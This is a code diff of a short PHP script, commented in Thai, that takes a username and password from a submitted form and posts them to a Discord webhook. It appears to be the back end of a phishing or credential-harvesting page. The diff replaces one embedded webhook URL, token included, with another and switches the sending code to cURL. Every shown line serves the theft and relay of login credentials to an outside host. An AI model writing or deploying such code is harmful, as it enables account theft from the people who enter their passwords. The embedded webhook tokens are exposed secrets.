@@ -4,24 +4,27 @@ $username = $_POST['username'];
 $password = $_POST['password'];
 
 // กำหนด URL ของ Discord Webhook
-$webhook_url = "https://discord.com/api/webhooks/1312092308895699035/ypBt7VvBXjOEHNqXioNGS-mGM83MfOxcbow7mlb___X0ufrTVwyIjOjEWT0mpa-Apm1t";
-
+$webhook_url = "https://discord.com/api/webhooks/1312102853791187086/K3qnve_v8w_WFzwxJaBixKWPFKFm_2z_a4akH8jfN0HgFuuqFj8gfMz94AHBz2WL9DNa";  // 
 // สร้างข้อความเพื่อส่งไปยัง Discord
 $data = [
     "content" => "**ข้อมูลทดลองเก็บได้:**\nUsername: $username\nPassword: $password",
 ];
 
-// ส่งข้อมูลไปยัง Webhook Discord
-$options = [
-    "http" => [
-        "header" => "Content-Type: application/json\r\n",
-        "method" => "POST",
-        "content" => json_encode($data),
-    ],
-];
-$context = stream_context_create($options);
-file_get_contents($webhook_url, false, $context);
+// ใช้ cURL เพื่อส่งข้อมูลไปยัง Discord Webhook
+$ch = curl_init($webhook_url);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 
-// แสดงข้อความว่าได้รับข้อมูลเรียบร้อยแล้ว
-echo "ข้อมูลได้ถูกส่งเรียบร้อยแล้ว!";
+// ส่งคำขอไปยัง Webhook และตรวจสอบผลลัพธ์
+$response = curl_exec($ch);
+curl_close($ch);
+
+// แสดงข้อความผลลัพธ์
+if ($response) {
+    echo "ข้อมูลได้ถูกส่งเรียบร้อยแล้ว!";
+} else {
+    echo "มีข้อผิดพลาดในการส่งข้อมูล!";
+}
 ?>
